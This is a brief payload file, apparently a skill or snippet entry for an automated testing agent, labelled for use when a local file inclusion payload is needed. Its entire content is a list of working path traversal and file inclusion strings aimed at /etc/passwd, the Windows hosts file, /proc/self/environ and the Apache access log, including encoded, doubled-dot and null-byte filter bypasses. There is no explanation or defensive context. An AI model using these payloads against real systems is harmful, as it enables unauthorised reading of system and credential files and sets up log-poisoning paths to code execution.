---
name: payload-lfi
when_to_use: 需要 LFI payload
---
# LFI
../../../etc/passwd
..\..\..\windows\system32\drivers\etc\hosts
....//....//....//etc/passwd
..%2F..%2F..%2Fetc%2Fpasswd
....\\....\\....\\windows\\system32\\drivers\\etc\\hosts
/var/log/apache2/access.log
/proc/self/environ
/etc/passwd%00
